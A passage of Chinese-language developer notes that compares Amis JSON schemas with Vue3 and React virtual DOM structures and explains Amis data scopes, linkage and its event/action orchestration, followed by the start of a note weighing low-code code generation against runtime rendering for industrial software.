className/style 对象 | class/style 对象 | className/style 对象 |\n| **事件绑定**  | onEvent            | on + 大写事件名     | on + 大写事件名         |\n| **自定义属性** | 直接在对象中定义           | attrs 对象       | data-* 属性          |\n\n### 2.3. 组件特性\n\n| 特性 | AMIS JSON | Vue3 VNode | React JSX VDom |\n|------|-----------|------------|----------------|\n| **组件复用** | \"$ref\" 引用 | 组件实例 | React.memo/PureComponent |\n| **状态管理** | data 字段 | reactive/ref | useState/useReducer |\n| **生命周期** | 通过 api 配置 | setup/生命周期钩子 | useEffect 等 hooks |\n\n### 2.4. 渲染流程\n\n| 阶段     | AMIS JSON | Vue3 VNode | React JSX VDom |     |\n| ------ | --------- | ---------- | -------------- | --- |\n| **解析** | JSON 解析器  | 模板编译       | JSX 转换         |     |\n| **更新** | 数据驱动      | 响应式系统      | 虚拟 DOM diff    |     |\n| **渲染** | 渲染引擎      | render 函数  | render 方法      |     |\n\n### 2.5. 数据绑定示例\n\n```javascript\n{\n  \"type\": \"text\",\n  \"value\": \"${username}\",\n  \"visibleOn\": \"this.show\"\n}\n```\n\n\n```javascript\n{\n  type: 'div',\n  props: {\n    innerHTML: state.username,\n    'v-show': show\n  }\n}\n```\n\n\n```javascript\n{\n  type: 'div',\n  props: {\n    children: username,\n    style: { \n      display: show ? 'block' : 'none' \n    }\n  }\n}\n```\n\n### 2.6. 条件渲染\n\n| AMIS JSON          | Vue3 VNode  | React JSX VDom |\n| ------------------ | ----------- | -------------- |\n| visibleOn/hiddenOn | v-if/v-show | 条件表达式          |\n```javascript\n{\n  \"type\": \"div\",\n  \"visibleOn\": \"this.show\"\n}\n```\n\n\n```javascript\n{\n  type: 'div',\n  props: {\n    'v-if': show\n  }\n}\n```\n\n\n```javascript\nshow && {\n  type: 'div',\n  props: {}\n}\n```\n\n### 2.7. 列表渲染\n\n```javascript\n{\n  \"type\": \"repeat\",\n  \"items\": {\n    \"type\": \"tpl\",\n    \"tpl\": \"${item}\"\n  },\n  \"source\": \"${items}\"\n}\n```\n\n```javascript\n{\n  type: 'Fragment',\n  children: items.map(item => ({\n    type: 'div',\n    key: item.id,\n    props: {\n      innerHTML: item.text\n    }\n  }))\n}\n```\n\n```javascript\n{\n  type: 'Fragment',\n  props: {\n    children: items.map(item => ({\n      type: 'div',\n      key: item.id,\n      props: {\n        children: item.text\n      }\n    }))\n  }\n}\n```\n\n## 3. Amis 基本概念&名词解释\n\n- 完全通过 `JSON 树` 配置出页面、应用\n\t- 有一个组件就叫做 `APP`，有个字段 `pages` 来承载所有页面\n- 数据与数据域\n\t- 首先会先尝试在当前组件的数据域中寻找变量，当成功找到变量时，通过数据映射完成渲染，停止寻找过程；\n\t- 当在当前数据域中没有找到变量时，则向上寻找，在父组件的数据域中，重复步骤`1`和`2`；\n\t- 一直寻找，直到顶级节点，也就是`page`节点，寻找过程结束。\n\t- 但是如果 url 中有参数，还会继续向上查找这层，所以很多时候配置中可以直接 `${id}` 取地址栏参数。\n- 数据域数据更新\n\t- 通常顶层数据域数据更新，孩子中具备数据域的组件都会更新，但更新代价大，性能差\n\t- 可配置 `trackExpression`\n\t\t1. `trackExpression` 配置成 `\"none\"` 也就是说不追踪任何数据。\n\t\t2. `trackExpression` 配置成 `\"${xxxVariable}\"` 这样 `xxxVariable 变化`了更新当前组件的数据链。\n- 模板，内部采用 [lodash template](https://lodash.com/docs/4.17.15#template) 实现\n```json hl:5\n{\n  \"data\": {\n    \"text\": \"World!\"\n  },\n  \"type\": \"page\",\n  \"body\": \"<h1>Hello</h1> <span>${text}</span>\"\n}\n```\n\n- 数据映射\n\t- 链式取值\n\t- 支持 `&`\n\t- 目前有以下三种 `namespace`\n\t\t- `window` 即全局变量\n\t\t- `ls` 即 localStorage， 如果值是 json 对象，可以直接当对象用比如：`${ls:xxxxxlocalStrorageKey.xxxx}`\n\t\t- `ss` 即 sessionStorage，同上。\n\t\t- `cookie` 即 cookies，同上\n\t- 过滤器&管道\n\t\t- 定义管道： `amisLib.registerFilter`\n\t- 表达式，记得使用 `loadsh` 和 `moment`\n\n```json hl:4\n{\n  \"type\": \"tpl\",\n  \"tpl\": \"当前作用域中变量 show 是 1 的时候才可以看得到我哦~\",\n  \"visibleOn\": \"${show === 1}\"\n}\n```\n\n- 联动\n\t- `visibleOn`\n\t- `disabledOn`\n\t- 接口联动一般只适用于初始化接口，例如：\n\t\t- `form`组件中的`initApi`；\n\t\t- `select`组件中的`source`选项源接口`url`, `data`只能用于主动联动；\n\t\t\t- `\"source\": \"/amis/api/mock2/options/level2?a=${a}\",` a 变化就会发请求\n\t\t\t- ![图片&文件](./files/20241107-2.png)\n\t\t- `service`组件中的`api`和`schemaApi`；\n\t\t- `crud`组件中的`api`；\n\t\t\t- crud 默认是跟地址栏联动，如果要做请关闭同步地址栏 syncLocation: false \n\t\t- 等等...\n\n### 3.1. 主动触发\n\n![图片&文件](./files/20241107-3.png)\n\n### 3.2. 发送指定数据\n\n`target`属性支持通过配置参数来发送指定数据，例如：`\"target\" :\"xxx?a=${a}&b=${b}\"`，这样就会把当前数据域中的`a`变量和`b`变量发送给目标`组件 xxx`\n\n### 3.3. 刷新目标组件\n\n```json\n{\n  \"type\": \"action\",\n  \"actionType\": \"reload\",\n  \"label\": \"刷新目标组件\",\n  \"target\": \"target1,target2\"\n}\n```\n\n### 3.4. 发送动态目标\n\n- 刷新目标支持表达式，比如目标的 `name` 可以配置成 `form-${ xxx ? '1' : '2'}`\n\n## 4. Amis 的事件&动作设计&事件流设计\n\n- 解决复杂的 UI 交互场景，支持渲染器事件监听和响应设计，无需关心组件层级关系\n\n### 4.1. 属性表\n\n| 属性名             | 类型                                                                                                                                                                                | 默认值     | 说明                                                                        |\n| --------------- | --------------------------------------------------------------------------------------------------------------------------------------------------------------------------------- | ------- | ------------------------------------------------------------------------- |\n| actionType      | `string`                                                                                                                                                                          | -       | 动作名称                                                                      |\n| args            | `object`                                                                                                                                                                          | -       | 动作属性`{key:value}`，支持数据映射                                                  |\n| data            | `object`                                                                                                                                                                          | -       | 追加数据`{key:value}`，支持数据映射，如果是触发其他组件的动作，则该数据会传递给目标组件，`> 2.3.2 及以上版本`        |\n| dataMergeMode   | `string`                                                                                                                                                                          | 'merge' | 当配置了 data 的时候，可以控制数据追加方式，支持合并(`merge`)和覆盖(`override`)两种模式，`> 2.3.2 及以上版本` |\n| preventDefault  | `boolean`\\|[表达式](https://aisuda.bce.baidu.com/amis/zh-CN/docs/concepts/expression)\\|[ConditionBuilder](https://aisuda.bce.baidu.com/amis/zh-CN/components/form/condition-builder) | false   | 阻止事件默认行为，`> 1.10.0 及以上版本支持表达式，> 2.9.0 及以上版本支持ConditionBuilder`            |\n| stopPropagation | `boolean`\\|[表达式](https://aisuda.bce.baidu.com/amis/zh-CN/docs/concepts/expression)\\|[ConditionBuilder](https://aisuda.bce.baidu.com/amis/zh-CN/components/form/condition-builder) | false   | 停止后续动作执行，`> 1.10.0 及以上版本支持表达式，> 2.9.0 及以上版本支持ConditionBuilder`            |\n| expression      | `boolean`\\|[表达式](https://aisuda.bce.baidu.com/amis/zh-CN/docs/concepts/expression)\\|[ConditionBuilder](https://aisuda.bce.baidu.com/amis/zh-CN/components/form/condition-builder) | -       | 执行条件，不设置表示默认执行，`> 1.10.0 及以上版本支持表达式，> 2.9.0 及以上版本支持ConditionBuilder`      |\n| outputVar       | `string`                                                                                                                                                                          | -       | 输出数据变量名                                                                   |\n| ignoreError     | `boolean`                                                                                                                                                                         | false   | 当动作执行出错后，是否忽略错误继续执行。`3.3.1 及以上版本支持`                                       |\n\n### 4.2. onEvent \n\n`onEvent-click-actions:[]`\n\n```json hl:5,6,7,17,28\n{\n  \"type\": \"button\",\n  \"label\": \"尝试点击、鼠标移入/移出\",\n  \"level\": \"primary\",\n  \"onEvent\": {\n    \"click\": { // 监听点击事件\n      \"actions\": [ // 执行的动作列表\n        {\n          \"actionType\": \"toast\", // 执行toast提示动作\n          \"args\": { // 动作参数\n            \"msgType\": \"info\",\n            \"msg\": \"派发点击事件\"\n          }\n        }\n      ]\n    },\n    \"mouseenter\": {{ // 监听鼠标移入事件\n      \"actions\": [\n        {\n          \"actionType\": \"toast\",\n          \"args\": {\n            \"msgType\": \"info\",\n            \"msg\": \"派发鼠标移入事件\"\n          }\n        }\n      ]\n    },\n    \"mouseleave\": {{ // 监听鼠标移出事件\n      \"actions\": [\n        {\n          \"actionType\": \"toast\",\n          \"args\": {\n            \"msgType\": \"info\",\n            \"msg\": \"派发鼠标移出事件\"\n          }\n        }\n      ]\n    }\n  }\n}\n```\n\n### 4.3. 获取上下文\n\n执行动作时，可以通过`${event.data}`获取事件对象的数据、通过`${__rendererData}`获取组件当前数据域\n\n```json hl:11\n{\n  \"type\": \"input-text\",\n  \"name\": \"age\",\n  \"label\": \"年龄：\",\n  \"onEvent\": {\n    \"change\": {\n      \"actions\": [\n        {\n          \"actionType\": \"toast\",\n          \"args\": {\n            \"msg\": \"${__rendererData|json}\"\n          }\n        }\n      ]\n    }\n  }\n}\n```\n\n### 4.4. 事件类型\n\n事件包含`渲染器事件`和`广播事件`。\n- 渲染器事件，由具体的渲染器组件提供，**每个渲染器组件**暴露的事件可以查看具体的[组件文档的事件表](https://aisuda.bce.baidu.com/amis/zh-CN/components/page#%E4%BA%8B%E4%BB%B6%E8%A1%A8)；\n- 广播事件，即`自定义事件`，可以自定义派发的事件名称`eventName`，其他渲染器可以监听该自定义事件并配置`响应动作`。\n\t- 动作包含`通用动作`、`组件动作`、`广播动作`、`自定义动作`，可以通过配置`actionType`来指定具体执行什么动作。\n\n### 4.5. 请求 ajax\n\n- ` \"expression\": \"${event.data.responseResult.responseStatus === 0}\"` 仅在这个条件才显示 toast \n- 当配置`silent: true`时，请求完成后不会弹出提示信息\n- 点击按钮，校验表单：\n\t- 通过` \"${event.data.validateResult.payload.name}\"` 来校验\n\n```json hl:14,15,17,35,28\n{\n  \"type\": \"page\",\n  \"data\": {\n    \"name\": \"lll\"\n  },\n  \"body\": [\n    {\n      \"type\": \"button\",\n      \"id\": \"b_001\",\n      \"label\": \"发送 Ajax 请求\",\n      \"level\": \"primary\",\n      \"confirmText\": \"确认要发出这个请求？\",\n      \"onEvent\": {\n        \"click\": {\n          \"actions\": [\n            {\n              \"actionType\": \"ajax\",\n              \"api\": {\n                \"url\": \"/amis/api/mock2/form/saveForm?name=${name}\",\n                \"method\": \"post\",\n                \"responseData\": {\n                  \"resId\": \"${id}\"\n                },\n                \"messages\": {\n                  \"success\": \"成功了！欧耶\",\n                  \"failed\": \"失败了呢。。\"\n                },\n                // `silent: true` \n              },\n              \"data\": {\n                \"age\": 18\n              }\n            },\n            {\n              \"actionType\": \"toast\",\n              \"expression\": \"${event.data.responseResult.responseStatus === 0}\",\n              \"args\": {\n                \"msg\": \"${event.data.responseResult|json}\"\n              }\n            }\n          ]\n        }\n      }\n    }\n  ]\n}\n```\n\n**动作属性**\n\n| 属性名      | 类型                                                      | 默认值 | 说明            |\n| -------- | ------------------------------------------------------- | --- | ------------- |\n| api      | [API](https://aisuda.bce.baidu.com/amis/docs/types/api) | -   | 接口配置          |\n| options  | `object`                                                | -   | 其他配置          |\n| messages | `{success: string, failed: string}`                     | -   | 请求成功/失败后的提示信息 |\n|          |                                                         |     |               |\n\n**其他属性**\n\n|属性名|类型|默认值|说明|\n|---|---|---|---|\n|outputVar|`string`|-|请求响应结果缓存在`${event.data.responseResult}`或`${event.data.{outputVar}}`|\n\n### 4.6. 弹窗\n\n- 通过配置`actionType: 'dialog'`实现 Dialog 弹窗\n- 通过配置`actionType: 'closeDialog'`实现关闭当前弹窗；\n- 附加配置`componentId`可以实现关闭指定弹窗。\n\n`button->onEnvent->click->actions->actionType`\n\n```json hl:13,14\n{\n  \"type\": \"page\",\n  \"body\": [\n    {\n      \"type\": \"button\",\n      \"className\": \"ml-2\",\n      \"label\": \"打开弹窗（模态）\",\n      \"level\": \"primary\",\n      \"onEvent\": {\n        \"click\": {\n          \"actions\": [\n            {\n              \"actionType\": \"dialog\",\n              \"dialog\": {\n                \"type\": \"dialog\",\n                \"title\": \"模态弹窗\",\n                \"id\": \"dialog_001\",\n                \"data\": {\n                  \"myage\": \"22\"\n                },\n                \"body\": [\n                  {\n                    \"type\": \"tpl\",\n                    \"tpl\": \"<p>对，你打开了模态弹窗</p>\",\n                    \"inline\": false\n                  }\n                ]\n              }\n            }\n          ]\n        }\n      }\n    }\n  ]\n}\n\n```\n\n| 属性名           | 类型                      | 默认值 | 说明                                                                              |\n| ------------- | ----------------------- | --- | ------------------------------------------------------------------------------- |\n| dialog        | `string`/`DialogObject` | -   | 指定弹框内容，格式可参考[Dialog](https://aisuda.bce.baidu.com/amis/zh-CN/components/dialog) |\n| waitForAction | `boolean`               | -   | 是否等待弹窗响应，开启后将等待弹窗操作                                                             |\n| outputVar     | `string`                | -   | 输出数据变量名, 输出数据格式为 `{confirmed: boolean; value: any[]}`，当 `waitForAction` 开启时才有用  |\n\n### 4.7. 抽屉\n\n类似于弹窗\n\n### 4.8. 动作属性（args）\n\n| 属性名         | 类型        | 默认值                           | 说明                                                                                         |\n| ----------- | --------- | ----------------------------- | ------------------------------------------------------------------------------------------ |\n| msgType     | `string`  | `\"info\"`                      | 消息类型 `info\\|success\\|error\\|warning`                                                       |\n| msg         | `string`  | -                             | 消息内容                                                                                       |\n| position    | `string`  | `top-center（移动端为center）`      | 提示显示位置 `top-right\\|top-center\\|top-left\\|bottom-center\\|bottom-left\\|bottom-right\\|center` |\n| closeButton | `boolean` | `false`                       | 是否展示关闭按钮                                                                                   |\n| showIcon    | `boolean` | `true`                        | 是否展示图标                                                                                     |\n| timeout     | `number`  | `5000（error类型为6000，移动端为3000）` | 持续时间                                                                                       |\n|             |           |                               |                                                                                            |\n\n### 4.9. 链接跳转\n\n通过配置`actionType: 'url'`或`actionType: 'link'`实现链接跳转\n\n|属性名|类型|默认值|说明|\n|---|---|---|---|\n|url|`string`|-|按钮点击后，会打开指定页面。可用 `${xxx}` 取值|\n|blank|`boolean`|`false`|如果为 `true` 将在新 tab 页面打开|\n|params|`object`|-|页面参数`{key:value}`，支持数据映射，`> 1.10.0 及以上版本`|\n\n### 4.10. 浏览器\n\n- 通过配置`actionType: 'goBack'`实现页面回退。\n- 通过配置`actionType: 'goPage'`实现浏览器页面的前进/后退。只有当历史记录中存在目标页面时才会生效。\n- 通过配置`actionType: 'refresh'`实现浏览器刷新。\n\n### 4.11. 打印\n\n`\"actionType\": \"print\",`\n\n### 4.12. 一个异步串行场景\n\n> vue中的做法是，`setEventData` 可以 通过它来设置 `setGlocal` `setPageDate` 等等来修改 vue pinia的数据\n\n```json hl:6,12,19\n{\n  \"onEvent\": {\n    \"click\": {\n      \"actions\": [\n        {\n          \"actionType\": \"wait\",\n          \"args\": {\n            \"time\": 3000\n          }\n        },\n        {\n          \"actionType\": \"setEventData\",\n          \"args\": {\n            \"key\": \"title\",\n            \"value\": \"页面标题：${window:document[title]}\"\n          }\n        },\n        {\n          \"actionType\": \"toast\",\n          \"args\": {\n            \"msg\": \"${title}\"\n          }\n        }\n      ]\n    }\n  }\n}\n\n```\n\n### 4.13. 自定义 JS\n\n- 通过配置`actionType: 'custom'`实现自定义 JS\n\t- JS 中可以访问以下对象和方法：\n- context，渲染器上下文\n- doAction() 动作执行方法，用于调用任何 `actionType` 指定的动作\n- event，事件对象，可以调用 setData()、stopPropagation()、preventDefault() 分别实现事件上下文设置、动作干预、事件干预，可以通过 event.data 获取事件上下文\n\n自定义函数签名： `script:(context,doAction,event)=>{}`\n\n```json hl:13\n{\n  \"type\": \"page\",\n  \"body\": [\n    {\n      \"type\": \"button\",\n      \"label\": \"发送一个 http 请求\",\n      \"level\": \"primary\",\n      \"onEvent\": {\n        \"click\": {\n          \"actions\": [\n            {\n              \"actionType\": \"custom\",\n              \"script\": \"doAction({actionType: 'ajax', args: {api: '/amis/api/mock2/form/saveForm'}});\\n //event.stopPropagation();\"\n            }\n          ]\n        }\n      }\n    }\n  ]\n}\n\n```\n\n看看源码部分\n\n```javascript hl:3\n// 外部可以直接调用doAction来完成动作调用  \n// 可以通过上下文直接编排动作调用，通过event来进行动作干预  \nlet result = await (scriptFunc as any)?.call(  \n  proxy,  \n  renderer,  \n  (action: ListenerAction) => runActions(action, renderer, event),  \n  event,  \n  action  \n);\n```\n\n调用的方式\n\n```json hl:8,10\n{\n  \"actions\": [\n    {\n      \"componentId\": \"u:52cd013e120f\",\n      \"actionType\": \"disabled\"\n    },\n    {\n      // promise的方式\n      \"script\": \"return new Promise((resolve, reject) => {setTimeout(() => {event.setData({...event.data, pId: '01027359'});resolve();}, 3000)})\",\n      // callback的方式 thunk function\n      \"script\": \"return (callback) => { setTimeout(() => {event.setData({...event.data, pId: '01027359' });callback();}, 3000) };\",\n      \"actionType\": \"custom\"\n    },\n    {\n      \"componentId\": \"u:e47e2c8e6be8\",\n      \"args\": {\n        \"value\": \"${pId}\"\n      },\n      \"actionType\": \"setValue\"\n    },\n    {\n      \"componentId\": \"u:52cd013e120f\",\n      \"actionType\": \"enabled\"\n    }\n  ]\n}\n\n```\n\n#### 4.13.1. 事件流数据覆盖\n\n有时在执行自定义 JS 的时候，希望该过程中产生的数据可以分享给后面的动作使用，此时可以通过`event.setData()`来实现事件上下文的设置，这样后面动作都可以通过事件上下文来获取共享的数据。\n\n注意：直接调用`event.setData()`将修改事件的原有上下文，如果不希望覆盖可以通过`event.setData({...event.data, ...{xxx: xxx}})`来进行数据的合并。\n\n### 4.14. 触发指定组件动作\n\n通过配置`componentId`或`componentName`来触发指定组件的动作（不配置将调用当前组件自己的动作），组件动作配置通过`args`传入`(> 1.9.0 及以上版本)`，动作参数请查看对应的组件的[动作表](https://aisuda.bce.baidu.com/amis/zh-CN/components/form/index#%E5%8A%A8%E4%BD%9C%E8%A1%A8)，更多示例请查看[组件事件动作示例](https://aisuda.bce.baidu.com/amis/examples/event/form)。\n\n#### 4.14.1. 示例\n\n![图片&文件](./files/20241107-4.png)\n\n#### 4.14.2. 修改 组件状态\n\n通过配置`actionType: 'show'`或`'hidden'`或`'enabled'`或`'disabled'`或`'static'`或`'nonstatic'`实现对指定组件的显示、隐藏、启用、禁用，仅支持实现了对应状态控制功能的数据`输入类`组件。\n\n![图片&文件](./files/20241107-5.png)\n\n#### 4.14.3. 刷新 CRUD 列表\n\n```json  hl:4,5\n{\n  \"actions\": [\n    {\n      \"componentId\": \"crud_id-1\",\n      \"actionType\": \"reload\",\n      \"data\": { // 还可以穿参数，取决于 crud 的实现\n        \"author\": \"${author}\"\n      }\n    }\n  ]\n}\n\n```\n\n#### 4.14.4. 切换到具体 Tab\n\n![图片&文件](./files/20241107-6.png)\n\n### 4.15. 注册自定义动作：`RendererAction` 中注册\n\n除了以上内置动作，你还可以注册自己的动作。\n- 通过对`RendererAction`的`run`方法的实现可以定制自己的动作逻辑，最后通过`registerAction`注册到 amis 事件动作中。\n\n```javascript\nimport {\n  ListenerAction,\n  ListenerContext,\n  registerAction,\n  RendererAction\n} from 'amis-core';\nimport {RendererEvent} from 'amis-core';\n\n// 动作定义\ninterface IMyAction extends ListenerAction {\n  actionType: 'my-action';\n  args: {\n    param1: string, // 动作参数1\n    param2: string // 动作参数2\n  };\n}\n\n/**\n * 我的动作实现\n */\nexport class MyAction implements RendererAction {\n  run(action: IMyAction, renderer: ListenerContext, event: RendererEvent<any>) {\n    const props = renderer.props;\n    const {param1, param2} = action.args;\n\n    // 你的动作逻辑\n    // ...\n  }\n}\n\n// 注册自定义动作\nregisterAction('my-action', new MyAction());\n```\n\n### 4.16. 触发广播\n\n![图片&文件](./files/20241107-7.png)\n\n### 4.17. 编排事件&动作\n\n>  events 和 actions 需要作区分\n\n#### 4.17.1. 条件与循环\n\n- 通过配置`expression: 表达式或ConditionBuilder组合条件`来实现条件逻辑\n- 通过配置`actionType: 'loop'`实现循环逻辑\n\n```json\n{\n  \"actions\": [\n    {\n      \"componentId\": \"crud_reload\",\n      \"actionType\": \"reload\",\n      \"data\": {\n        \"author\": \"${author}\"\n      }\n    },\n    // 仅在 expression 表达式为真时，才会触发 toast\n    {\n      \"actionType\": \"toast\",\n      \"args\": {\n        \"msgType\": \"success\",\n        \"msg\": \"expression表达式 ok~\"\n      },\n      \"expression\": \"expression === \\\"okk\\\"\"\n    },\n    // 循环发送两次请求，且每次携带了循环的数据\n    {\n      \"actionType\": \"loop\",\n      \"args\": {\n        \"loopName\": \"${loopName}\"\n      },\n      \"children\": [\n        {\n          \"actionType\": \"ajax\",\n          \"args\": {\n            \"api\": \"/amis/api/mock2/form/saveForm?name=${name}&age=${age}\"\n          }\n        }\n      ]\n    }\n  ]\n}\n\n```\n\n- 嵌套循环，\n\t- 注意配置 `children`\n- 通过配置`actionType: 'loop'`和`actionType: 'break'`实现循环跳出。\n- 通过配置`actionType: 'loop'`和`actionType: 'continue'`实现循环跳过。\n- 通过配置`actionType: 'switch'`实现排他逻辑。\n- 通过配置`actionType: 'parallel'`实现并行执逻辑。\n\t- children `子动作`\n\t- 比如同时发送两个 ajax 请求，并显示请求返回\n\n> 所以本质是一棵树，里面有 `children` 等属性，但要注意的是，action 上下文数据是有连贯性的\n\n### 4.18. 动作间的事件传递\n\n1、事件触发开始，整个数据流包含事件本身产生的事件数据和动作产生的动作数据，事件源头产生的数据在 AMIS 事件动作机制底层已经自动加入**渲染器数据域**，可以通过`xxx`直接获取\n\n比如\n\n![图片&文件](./files/20241107-8.png)\n\n>  events → click → `actions:[] （可编排）` \n\n2、部分动作产生的数据如何流动需要**交互设计者进行介入**，对于数据流动可以通过数据映射，将上一个动作产生的数据作为动作参数写入下一个动作\n\n3、可以通过表达式函数`GETRENDERERDATA(id, path)`和`GETRENDERERPROP(id, path)`分别获取指定组件的数据和属性\n\n| 参数名  | 说明                 |\n| ---- | ------------------ |\n| id   | 组件 ID，即组件的 id 属性的值 |\n| path | 数据路径，即数据变量的路径      |\n\n![图片&文件](./files/20241107-9.png)\n\n> 同样的，vue 是可以直接拿到全局数据的，从这种模板里面\n\n### 4.19. 干预动作执行\n\n事件动作干预是指执行完当前动作后，干预所监听事件默认处理逻辑和后续其他动作的执行。\n- 通过`preventDefault`、`stopPropagation`分别阻止监听事件默认行为和停止下一个动作执行。\n\n#### 4.19.1. 阻止默认行为\n\n```json hl:8\n{\n  \"actions\": [\n    {\n      \"actionType\": \"toast\",\n      \"args\": {\n        \"msg\": \"不关闭\"\n      },\n      \"preventDefault\": \"command === \\\"Do not close\\\"\"\n    }\n  ]\n}\n\n```\n\n通过表达式\n\n```json hl:6\n{\n  \"confirm\": {\n    \"actions\": [\n      {\n        \"actionType\": \"preventDefault\",\n        \"expression\": \"${command === 'Do not close'}\"\n      }\n    ]\n  }\n}\n\n```\n\n#### 4.19.2. 停止后续动作执行\n\n通过`onEvent`可以对监听的事件配置一组动作，这些动作是顺序执行的，有时间设计者希望执行某个/些动作后就停止继续执行后面的动作，这时候可以通过`stopPropagation`来停止执行后面配置的所有动作。\n\n编辑代码\n```json\n{\n  \"actions\": [\n    {\n      \"actionType\": \"toast\",\n      \"args\": {\n        \"msgType\": \"info\",\n        \"msg\": \"动作1\"\n      }\n    },\n    {\n      \"actionType\": \"toast\",\n      \"args\": {\n        \"msgType\": \"info\",\n        \"msg\": \"动作2\"\n      },\n      \"stopPropagation\": true\n    },\n    {\n      \"actionType\": \"toast\",\n      \"args\": {\n        \"msgType\": \"info\",\n        \"msg\": \"动作3\",\n        \"position\": \"top-right\"\n      }\n    }\n  ]\n}\n```\n\n或者通过表达式\n\n```json\n{\n  \"actionType\": \"stopPropagation\",\n  \"expression\": \"${command === 'Do not close'}\"\n}\n```\n\n#### 4.19.3. 忽略动作报错继续执行\n\n>  可以通过`ignoreError: true`来忽略动作报错继续执行后面的动作\n\n## 5. Amis 行为\n\n页面的交互操作，例如：**提交表单、显示一个弹框、跳转页面、复制一段文字到粘贴板**等等操作，都可以视作页面的一种**行为**。\n\n在 amis 中，大部分 **行为** 是跟 **行为按钮组件** 进行绑定的，也就是说，当你想要配置一个行为，大部分情况下你应该遵循下面的步骤：\n1. 添加一个 **行为按钮组件**；\n2. 配置当前 **行为类型（actionType）**；\n3. 根据当前行为类型，配置你想要的 **属性**。\n\n更多见 **Action 按钮组件**\n\n## 6. Amis：class、主题、css变量\n\n- amis 中有大量的`功能类 class` 可以使用\n- 即主题，css 变量等\n\n## 7. 结论\n\n- amis 使用 vue 实现的可能性分析 ？ \n\t- 可以参考啊\n\t- 理论上没什么问题的\n- 本质是：\n\t- 再基于 Vue 包一层 DSL 而已，JSON Schema 的协议可以参考 Amis 的结构\n- 但 Amis 的功能点较多，先实现最小 MVP\n\t- ==amis 的事件流的设计很符合业务要求==\n\n\n\n","u7ihGVCT":"\n# 低代码的研发搭建模式探讨\n\n`#lowcode` \n\n\n## 目录\n<!-- toc -->\n ## 1. 背景 \n\n- ==不同形态解决不同场景问题的低代码产品==\n\t- 包括模型驱动、API驱动、流程表单搭建、小程序搭建、零代码搭建、业务配置化等众多场景\n\t- 从降本、体系、业务赋能、解资源瓶颈等多方面起到了不错的成效；\n- 所以**低代码平台本质上是个产品而非技术中间件** \n\n---\n\n> 一句话：面向制造行业数字转型的低代码研发平台\n\n看看当下的背景\n- 工业领域做了不少项目，大多数西门子的实施代理\n- 希望每次做一个项目，能够逐渐沉淀下来\n- 客户群体：\n\t- 制造业\n\t\t- 海尔\n\t\t- 广汽等\n\t- 军工\n\t- 国企央企\n- 明确国产化，不用国外的工业软件，比如西门子等，所以**对技术栈有要求**\n\t- ==国产数据库==\n\t- 华为设备\n\t- 比如前端要求是 Vue3 \n\t- 等等\n- 大部分项目有涉密场景\n- 已经实施过很多项目，这些项目怎么办？\n\t- ==如何回收==？\n\t- 如何继续迭代？\n\t- 等等\n\n## 2. 为什么要低代码\n\n### 2.1. 资源瓶颈\n\n- 专业前端 -> 非专业前端\n- 需要前端 -> 无需前端\n- 需要研发 -> 无需研发\n- BI开发 -> BI + 业务运营自交付\n- ...\n\n### 2.2. 交付提效\n\n#### 2.2.1. 模型驱动\n\n- 模型驱动：\n\t- 一般是指通过服务端的模型定义，自动生成全套CRUD页面的模式\n\t- 通常是提供给服务端开发同学，用来开发具备一般规律的基本管理页面的。\n\t- 模型驱动又分两种模式\n\t\t- 一种是从**最底层模型设计**开始，把服务端代码编写的部分也低代码化\n\t\t\t- 这种对于一般研发团队来说==与现有存量业务结合比较困难==，对于后续系统维护和优化也不够友好。\n\t\t- 另一种更适合的方案是 **API 驱动**\n\t\t\t- 通过基于**OneApi/OpenAPI等协议描述**的接口信息，驱动生产全套CRUD的界面\n\t\t\t- 该模式对服务端开发的既有模式几乎没什么改变，也是目前企业智能团队应用最广泛的模式。\n\n> 提供两种数据能力：智能体厂 + API 编排\n\n### 2.3. 业务赋能\n\n- 数字化转型背景下\n\t- 在于行业背景，**行业提效，沉淀行业最佳实践，或者 SOP** \n\n## 3. 现有团队情况\n\n- 存量的产品、存量的组件，存量的技术沉淀如何对待？\n- 这==技术本质==是 **低代码的产物如何与源码的产物如何融合的问题**\n- 最好是：\n\t- 满足低代码和源码两种生产方式可以**同时存在**\n\t- 且兼顾联调体验；\n\t- 解决方案：\n\t\t- 通过**微前端、模块联邦等技术**，让低码和源码的产物可以充分融合渲染\n\n## 4. 出码还是渲染\n\n![图片&文件](./files/20241201-17.png)\n\n针对工业软件的平台分析\n- ==实时性==要求\n- 中后台偏多\n- 人员能力\n\t- 出码技术要求相对较高\n\t- 且交互周期相对长\n\n### 4.1. 出码\n\n出码的两种形态：**单向转换和双向转换**\n- 理论上两种模式都能实现，但同样的还是要匹配到**合适的用户合适的使用场景**上。\n- 单向转换\n\t- 非前端页面场景，需要转成特定 DSL 或 目标语言\n\t- 比如==转向小程序==\n\t- 性能优化链路\n\t\t- 需要源码作为客户交付物\n\t\t- 可以转成更熟悉可读的DSL\n\t- 劣势：**代码修改后无法转回**\n- 双向转换\n\t- 要牺牲灵活性，转成有约束的DSL\n\t- 劣势：\n\t\t- 新 DSL 对用户不友好，学习成本高，与业界通用技能脱节\n\t- 适用场景：\n\t\t- 多分支合并等场景作为中间码使用\n\n> 出码不好的点在于，出==码那一刻技术加锁定了==\n\n### 4.2. 选择\n\n建议选择**渲染方案** ，而非**出码方案**\n\n> 未来真需要出码，技术也是可以做到的\n\n## 5. 如何协作并行开发？\n\n![图片&文件](./files/20241201-18.png)\n\n- 传统源码思维里，涉及到多人协作，多迭代，解法就是 **git 版本管理**\n- 低代码领域，更推荐**产品思维**\n\t- 从用户视角出发，本身平台提供的便是低代码甚至是零代码，在这个前提下，版本 diff 合并这样的操作是违和的。\n\n### 5.1. 业界建议的思路是：\n\n- 首先要削弱：\n\t- 通过**产品设计**，对可能产生多分支协作的场景**尽可能的规避**\n\t- 理论上**用户操作的单元越小**，产生多人/多迭代同时操作的可能性就越低。\n- 削弱过后\n\t- 可能解决80%的问题，剩下的就需要**硬刚**\n\t\t- 这里面可以还是借助 git 的成熟体系，通过出码等方式讲低码转换成用户可理解的DSL 进行 diff 和merge。\n- 最后**低代码产品还是要回归低码的心智**\n\t- 对多分支的产品形态要进行**优化**, 这里重点是落在可视化diff和merge的决策辅助上，低代码产品的用户，通过可视化编排的方式生产，那也需要通过可视化的方式来查看差异；\n\t- 同样对于冲突的解决，也需要更加低成本低门槛的决策方式。\n\t- 在这个部分，UIPaaS 目前也处于前期探索阶段。\n\n### 5.2. 我们的思路是：\n\n- ==没有出码，只有运行时==\n- 存量的系统产品业务，继续 Run，通过**微前端**的方式集成到低代码平台\n\t- 尽量不维护，但是特别场景，交付紧急的场景继续通过传统的开发方式维护迭代\n- 